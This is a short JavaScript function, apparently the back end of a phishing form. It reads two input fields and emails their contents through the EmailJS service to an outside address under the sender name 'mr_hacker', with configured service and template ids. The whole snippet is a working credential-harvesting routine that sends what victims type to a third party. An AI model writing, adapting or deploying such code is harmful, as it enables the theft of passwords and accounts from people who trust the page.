function user_one() {
    (function() {

        emailjs.init("5J9lA87kIddmocD_J")
        
    })(); 

    var input =  document.getElementById("A").value 
    var input_2 = document.getElementById("B").value ; 

    var params = {from_name:"mr_hacker" , email_id:"mistrhaker55@gmail.com" ,
    message: input + ":" +input_2 }

    var serviceID = "service_o5z1jg8"
    var templateID = "template_98v6gvg"

    emailjs.send(serviceID , templateID , params )

    .then(res =>{
        "you Good"
    })
    .catch() ; 


    
}

